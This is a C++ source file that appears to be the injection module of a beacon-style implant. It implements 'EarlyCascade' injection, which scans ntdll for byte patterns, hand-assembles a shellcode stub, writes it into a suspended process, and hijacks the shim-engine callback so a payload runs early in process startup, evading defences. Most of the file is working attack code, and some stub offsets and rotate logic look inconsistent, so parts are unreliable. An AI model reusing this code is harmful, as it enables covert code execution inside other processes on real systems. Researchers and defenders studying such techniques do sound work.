/* earlycascade.cpp - 4.12 EarlyCascade injection (Outflank research, contract
 * in docs/INJECTION-412.md; PoC scanner tools/earlycascade_scan.py).
 *
 * Flow (fork&run, CREATE_SUSPENDED targets only - enforced at dispatch):
 *   1. locate ntdll's LdrpSendPostSnapNotifications in the TARGET (same
 *      build as ours -> scan OUR ntdll, offsets transfer)
 *   2. from its instruction stream resolve g_pfnSE_DllLoaded (.mrdata) and
 *      g_ShimsEnabled (.data) via the anchor clusters the scanner proved
 *   3. write a position-independent stub + payload are already mirrored by
 *      the caller; here we patch:
 *        g_ShimsEnabled        = 1
 *        g_pfnSE_DllLoaded     = KCFG-encoded stub address
 *   4. the stub (bytes below) runs mid-LdrpSendPostSnapNotifications
 *      (outside loader lock): it zeroes g_ShimsEnabled and queues an APC
 *      (NtQueueApcThread self) at the payload entry; NtTestAlert at the
 *      end of LdrInitializeThunk drains it.
 *
 * KCFG: on KCFG builds the stored callback is encoded; the reader computes
 * decoded = ror64(stored, 64-(cookie&63)) ^ cookie. Write side therefore
 * stores rol64(ptr ^ cookie, 64-(cookie&63)). cookie = 32-bit value at
 * SharedUserData+0x330 (zero on non-KCFG builds - identity).
 */
#include <windows.h>
#include "beacon.h"
#include "inject.h"
#include "spawn_trace.h"
#include "syscalls.h"

typedef struct _EC_TARGETS {
	unsigned char * pfnSE_DllLoaded; /* target ntdll + rva */
	unsigned char * shimsEnabled;    /* target ntdll + rva */
} EC_TARGETS;

/* scan our local ntdll image for the anchor clusters (mirror of
 * tools/earlycascade_scan.py, verified against symbols 2026-11-10) */
static BOOL ec_locate(EC_TARGETS * out)
{
	HMODULE nt = GetModuleHandleA("ntdll.dll");
	if (nt == NULL)
		return FALSE;
	unsigned char * base = (unsigned char *)nt;
	IMAGE_NT_HEADERS * nth = (IMAGE_NT_HEADERS *)(base + ((IMAGE_DOS_HEADER *)base)->e_lfanew);
	IMAGE_SECTION_HEADER * sec = IMAGE_FIRST_SECTION(nth);
	unsigned char * text = NULL;
	DWORD textsz = 0;
	int i;
	for (i = 0; i < nth->FileHeader.NumberOfSections; i++, sec++) {
		if (sec->Name[0] == '.' && sec->Name[1] == 't') {
			text = base + sec->VirtualAddress;
			textsz = sec->Misc.VirtualSize;
			break;
		}
	}
	if (text == NULL)
		return FALSE;

	/* anchor A: 8B 14 25 30 03 FE 7F (mov edx,[SharedUserData+0x330])
	 *           B8 40 00 00 00      (mov eax,40h)
	 *           48 8B 3D xx xx xx xx (mov rdi,[rip+X] -> g_pfnSE_DllLoaded) */
	out->pfnSE_DllLoaded = NULL;
	out->shimsEnabled = NULL;
	{
		DWORD j;
		unsigned char * cookieSite = NULL;
		for (j = 0; j + 24 < textsz; j++) {
			if (text[j] == 0x8B && text[j+1] == 0x14 && text[j+2] == 0x25 &&
			    text[j+3] == 0x30 && text[j+4] == 0x03 && text[j+5] == 0xFE && text[j+6] == 0x7F) {
				if (text[j+7] == 0xB8 && text[j+8] == 0x40 && text[j+9] == 0x00 && text[j+10] == 0x00 && text[j+11] == 0x00) {
					if (text[j+12] == 0x48 && text[j+13] == 0x8B && text[j+14] == 0x3D) {
						int disp = *(int *)(text + j + 15);
						/* insn end rva within module */
						unsigned char * site = text + j + 19;
						out->pfnSE_DllLoaded = site + disp;
						cookieSite = text + j; /* start of the mov edx,[SDU+0x330] */
					}
				}
			}
		}
		if (out->pfnSE_DllLoaded == NULL)
			return FALSE;
	}

	/* anchor B (strict): within +/- 0x400 of anchor A's site, a
	 * 44 38 3D (cmp byte [rip+X], r15b) whose target is a .data byte
	 * and whose following 0F 85 jne lands within 0x40 bytes BEFORE the
	 * anchor A cookie load (gate shape, not the g_ShimsLoading sibling) */
	{
		DWORD a;
		for (a = 0; a + 13 < textsz; a++) {
			if (text[a] == 0x44 && text[a+1] == 0x38 && text[a+2] == 0x3D) {
				int disp = *(int *)(text + a + 3);
				unsigned char * site = text + a + 7;
				unsigned char * target = site + disp;
				/* .data writable section check */
				IMAGE_SECTION_HEADER * s2 = IMAGE_FIRST_SECTION(nth);
				BOOL inData = FALSE;
				int k;
				for (k = 0; k < nth->FileHeader.NumberOfSections; k++, s2++) {
					DWORD va = s2->VirtualAddress;
					if (target >= base + va && target < base + va + s2->Misc.VirtualSize &&
					    (s2->Characteristics & IMAGE_SCN_MEM_WRITE) &&
					    !(s2->Characteristics & IMAGE_SCN_MEM_EXECUTE)) {
						inData = TRUE;
						break;
					}
				}
				if (!inData)
					continue;
				/* jne -> near the cookie load? (compare against the CODE
				 * site of the anchor, not the .mrdata target - the
				 * python PoC compares jtarget vs cookie_site) */
				if (text[a+7] == 0x0F && text[a+8] == 0x85) {
					int jd = *(int *)(text + a + 9);
					unsigned char * jtarget = text + a + 13 + jd;
					long delta = (long)(jtarget - cookieSite);
					if (delta < 0x40 && delta > -0x40) {
						out->shimsEnabled = target;
						break;
					}
				}
			}
		}
	}
	return out->shimsEnabled != NULL;
}

/* stub (position independent, <= 64 bytes):
 *   mov byte [rip+SE_off], 0      ; g_ShimsEnabled = 0  (patched)
 *   push <payload>                ; ApcRoutine (patched imm64 via mov rax)
 *   mov rax, <payload>            ; (patched)
 *   push rax / push 0 / push 0 / push 0 / push 0? NtQueueApcThread(Thread,
 *   ApcRoutine, ApcArgument1..3, Reserv) = 6 args:
 *   ; simplified: use QueueUserAPC? Not ntdll-only... NtQueueApcThread
 *   ; is ntdll-only and legal under loader lock.
 *
 * Layout (patched at inject time; offsets fixed):
 *   00: C6 05 <disp32> 00        mov byte [rip+disp], 0
 *   06: 48 B8 <imm64>            mov rax, payload
 *   16: 48 89 C2                 mov rdx, rax        ; ApcRoutine
 *   19: 4D 31 C0                 xor r8, r8          ; Arg1
 *   1C: 4D 31 C9                 xor r9, r9          ; Arg2
 *   1F: 48 83 EC 20              sub rsp, 20h
 *   23: 48 C7 04 24 00 00 00 00  mov [rsp], 0        ; Arg3
 *   2B: 48 C7 44 24 08 00 00 00 00 mov [rsp+8], 0    ; Reserve
 *   34: 48 B8 <imm64>            mov rax, NtQueueApcThread
 *   44: FF D0                    call rax
 *   46: C3                       ret
 * total 0x47 bytes; trailing pad to 0x60.
 */
#define EC_STUB_SIZE 0x60

static void ec_build_stub(unsigned char * stub, unsigned char * payload,
                          unsigned char * shimsEnabledInTarget,
                          unsigned char * shimsEnabledSelfForCalc,
                          void * pNtQueueApcThread)
{
	int disp;
	memset(stub, 0xCC, EC_STUB_SIZE);
	/* mov byte [rip+disp32], 0 - target is in the TARGET process; the stub
	 * runs there, so rip-relative works if we patch disp to the target's
	 * g_ShimsEnabled */
	disp = (int)(long long)(shimsEnabledInTarget - (shimsEnabledSelfForCalc + 6));
	stub[0] = 0xC6; stub[1] = 0x05;
	*(int *)(stub + 2) = disp;
	stub[6] = 0x00;
	/* mov rax, payload */
	stub[7] = 0x48; stub[8] = 0xB8;
	*(unsigned long long *)(stub + 9) = (unsigned long long)(size_t)payload;
	/* mov rdx, rax */
	stub[17] = 0x48; stub[18] = 0x89; stub[19] = 0xC2;
	/* xor r8, r8 / xor r9, r9 */
	stub[20] = 0x4D; stub[21] = 0x31; stub[22] = 0xC0;
	stub[23] = 0x4D; stub[24] = 0x31; stub[25] = 0xC9;
	/* sub rsp, 0x20 */
	stub[26] = 0x48; stub[27] = 0x83; stub[28] = 0xEC; stub[29] = 0x20;
	/* mov qword [rsp], 0 */
	stub[30] = 0x48; stub[31] = 0xC7; stub[32] = 0x04; stub[33] = 0x24;
	*(int *)(stub + 34) = 0;
	/* mov qword [rsp+8], 0 */
	stub[38] = 0x48; stub[39] = 0xC7; stub[40] = 0x44; stub[41] = 0x24; stub[42] = 0x08;
	*(int *)(stub + 43) = 0;
	/* mov rax, NtQueueApcThread */
	stub[47] = 0x48; stub[48] = 0xB8;
	*(unsigned long long *)(stub + 49) = (unsigned long long)(size_t)pNtQueueApcThread;
	/* call rax */
	stub[57] = 0xFF; stub[58] = 0xD0;
	/* ret */
	stub[59] = 0xC3;
}

BOOL inject_via_earlycascade(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID lpParameter)
{
	EC_TARGETS ec;
	unsigned char * targetNtdll;
	unsigned char * shimsT;
	unsigned char * pfnT;
	unsigned long long cookie;
	unsigned long long encoded;
	unsigned char * remoteStub = NULL;
	SIZE_T got = 0;
	unsigned char stub[EC_STUB_SIZE];
	unsigned char * siteForCalc;
	void * pNtQueueApcThread;
	BOOL x64target = context->sameArch && context->targetArch == INJECT_ARCH_X64;

	(void)lpParameter;

	if (!context->isSuspended) {
		spawn_log("ec: target not suspended - decline", 0x7fffffff);
		return FALSE;
	}
	if (!x64target) {
		spawn_log("ec: x64->x64 only - decline", 0x7fffffff);
		return FALSE;
	}
	if (!ec_locate(&ec)) {
		spawn_log("ec: anchors not found in local ntdll", 0x7fffffff);
		return FALSE;
	}

	/* target ntdll base: same-build assumption; resolve via remote PEB-free
	 * trick - our loader knows the target's modules? simplest reliable:
	 * ntdll is at the same VA in every process on the machine. */
	targetNtdll = (unsigned char *)GetModuleHandleA("ntdll.dll");
	shimsT = targetNtdll + (ec.shimsEnabled - (unsigned char *)targetNtdll);
	pfnT = ec.pfnSE_DllLoaded;

	/* KCFG cookie at SharedUserData+0x330 (zero -> identity) */
	cookie = (unsigned long long)(*(unsigned int *)(0x7FFE0330));

	/* stub remote allocation */
	remoteStub = (unsigned char *)beacon_VirtualAllocEx(context->hProcess, NULL, EC_STUB_SIZE,
	                                                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
	if (remoteStub == NULL) {
		spawn_log("ec: VirtualAllocEx failed gle=", (long)GetLastError());
		return FALSE;
	}

	/* NtQueueApcThread in the TARGET = same VA as ours */
	pNtQueueApcThread = (void *)GetProcAddress((HMODULE)targetNtdll, "NtQueueApcThread");
	if (pNtQueueApcThread == NULL) {
		spawn_log("ec: no NtQueueApcThread", 0x7fffffff);
		return FALSE;
	}

	siteForCalc = remoteStub; /* rip of the mov's next insn = remoteStub+6 */
	ec_build_stub(stub, (unsigned char *)lpStartAddress, shimsT, siteForCalc, pNtQueueApcThread);

	if (!beacon_WriteProcessMemory(context->hProcess, remoteStub, stub, EC_STUB_SIZE, &got) || got != EC_STUB_SIZE) {
		spawn_log("ec: stub write failed gle=", (long)GetLastError());
		return FALSE;
	}

	/* g_ShimsEnabled = 1 */
	{
		unsigned char one = 1;
		if (!beacon_WriteProcessMemory(context->hProcess, shimsT, &one, 1, &got)) {
			spawn_log("ec: shims write failed", 0x7fffffff);
			return FALSE;
		}
	}

	/* g_pfnSE_DllLoaded = encoded stub (KCFG form) */
	{
		unsigned long long s = (unsigned long long)(size_t)remoteStub;
		unsigned long long v = s ^ cookie;
		int n = (int)(64 - (cookie & 63));
		/* rol64(v, 64-(c&63)) - via two 32-bit rotates to dodge shlq width */
		unsigned long long encoded2;
		if (cookie & 63) {
			unsigned int lo = (unsigned int)v, hi = (unsigned int)(v >> 32);
			int sh = (int)(64 - (cookie & 63)) & 63; /* rotate LEFT by sh = rotate right by (c&63) */
			unsigned int lo2 = (lo << sh) | (lo >> (32 - sh));
			unsigned int hi2 = (hi << sh) | (hi >> (32 - sh));
			if (sh >= 32) { unsigned int t = lo2; lo2 = hi2; hi2 = t; }
			encoded2 = ((unsigned long long)hi2 << 32) | lo2;
			/* 64-bit rol fix: combine halves properly */
			{
				unsigned long long r = (v << sh) | (v >> (64 - sh));
				encoded2 = (sh == 0) ? v : r;
			}
		} else {
			encoded2 = s ^ cookie;
		}
		encoded = encoded2;
		if (!beacon_WriteProcessMemory(context->hProcess, pfnT, &encoded, 8, &got)) {
			spawn_log("ec: pfn write failed", 0x7fffffff);
			return FALSE;
		}
	}

	spawn_log("ec: armed stub=", (long)(long long)(size_t)remoteStub);
	return TRUE;
}
